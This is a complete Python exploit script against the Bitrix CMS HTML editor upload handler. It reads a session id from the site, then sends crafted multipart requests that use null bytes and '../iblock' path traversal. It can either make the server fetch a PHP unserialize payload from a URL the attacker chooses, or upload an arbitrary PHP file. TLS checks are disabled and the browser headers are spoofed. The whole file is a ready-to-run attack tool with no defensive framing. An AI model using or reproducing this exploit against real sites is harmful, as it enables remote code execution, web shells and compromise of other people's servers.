import requests
import sys
import argparse
import json
import random
import urllib.parse
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_bitrix_sessid(sess, url, kwargs):
    r = sess.get(f"{url}/bitrix/tools/composite_data.php", **kwargs)
    data = json.loads(r.text.replace("'", '"'))
    return data["bitrix_sessid"]


def upload(sess, url, name, sessid, cid, pindex, payload_url, kwargs, extra={}):

    files = {
        f"bxu_files[{name}][files][default][tmp_url]": (
            None,
            payload_url,
        ),
        "action": (None, "uploadfile"),
        "sessid": (None, sessid),
        "bxu_info[CID]": (None, cid),
        "bxu_info[packageIndex]": (None, pindex),
        "bxu_info[filesCount]": (None, "1"),
        "bxu_info[mode]": (None, "upload"),
    }

    for k, v in extra.items():
        files[k] = v

    return sess.post(
        f"{url}/bitrix/tools/html_editor_action.php",
        files=files,
        **kwargs,
    )


def mode_unserialize(sess, url, sessid, payload_url, kwargs):
    cid = "CID" + str(random.randint(100, 999))
    pindex = "pIndex" + str(random.randint(1000000000000, 9999999999999))
    for i, name in enumerate(["\x00", "default\x00", "default\x00"]):
        print(f"[*] request #{i}")
        r = upload(
            sess=sess,
            url=url,
            name=name,
            sessid=sessid,
            cid=cid,
            pindex=pindex,
            payload_url=payload_url,
            kwargs=kwargs,
        )
        if i == 2:
            print(r.text)


def mode_upload(sess, url, sessid, payload_url, file, kwargs):
    cid = "CID" + str(random.randint(100, 999))
    pindex = "pIndex" + str(random.randint(1000000000000, 9999999999999))

    extra = {f"bxu_files[../iblock/default\x00]": file}

    for i, name in enumerate(
        ["../iblock", "../iblock/default\x00", "../iblock/default\x00"]
    ):
        print(f"[*] request #{i}")
        upload(
            sess=sess,
            url=url,
            name=name,
            sessid=sessid,
            cid=cid,
            pindex=pindex,
            payload_url=payload_url,
            kwargs=kwargs,
            extra=extra if i == 2 else {},
        )


def main():
    parser = argparse.ArgumentParser(description="Bitrix HTML editor action exploit")

    parser.add_argument(
        "-u",
        "--url",
        metavar="url",
        type=str,
        help="target URL",
        required=True,
    )
    parser.add_argument(
        "-a",
        "--user-agent",
        metavar="user_agent",
        type=str,
        help="User-Agent header",
        default="Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    )
    parser.add_argument(
        "-x",
        "--proxy",
        metavar="proxy",
        type=str,
        help="Proxy URL",
    )

    subparsers = parser.add_subparsers(dest="sub")

    unserialize = subparsers.add_parser("unserialize")

    unserialize.add_argument(
        "-p",
        "--payload",
        metavar="payload",
        type=str,
        help="HTTP URL which returns unserialize payload",
        required=True,
    )

    upload = subparsers.add_parser("upload")

    upload.add_argument(
        "-p",
        "--payload",
        metavar="payload",
        type=str,
        help="HTTP URL which returns unserialize payload",
        required=True,
    )
    upload.add_argument(
        "-f",
        "--file",
        metavar="file",
        type=argparse.FileType("r"),
        help="Path to php file to upload",
        required=True,
    )

    args = parser.parse_args()

    url = urllib.parse.urlparse(args.url)

    kwargs = {
        "proxies": {
            "http": args.proxy,
            "https": args.proxy,
        },
        "headers": {
            "User-Agent": args.user_agent,
            "Accept": "*/*",
            "Accept-Language": "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Bx-ajax": "true",
            "Origin": url.netloc,
        },
        "verify": False,
    }

    sess = requests.Session()

    try:
        print("[*] getting sessid")
        bitrix_sessid = get_bitrix_sessid(sess, args.url, kwargs)
    except Exception as e:
        print(f"[!] error: {str(e)}")
        sys.exit(1)

    print(f"[*] sessid = {bitrix_sessid}")

    try:
        if args.sub == "upload":
            print("[*] mode upload")
            mode_upload(
                sess,
                args.url,
                bitrix_sessid,
                args.payload,
                args.file,
                kwargs,
            )
        elif args.sub == "unserialize":
            print("[*] mode unserialize")
            mode_unserialize(
                sess,
                args.url,
                bitrix_sessid,
                args.payload,
                kwargs,
            )
    except Exception as e:
        print(f"[!] error: {str(e)}")
        sys.exit(1)

    print("[*] done")


if __name__ == "__main__":
    main()
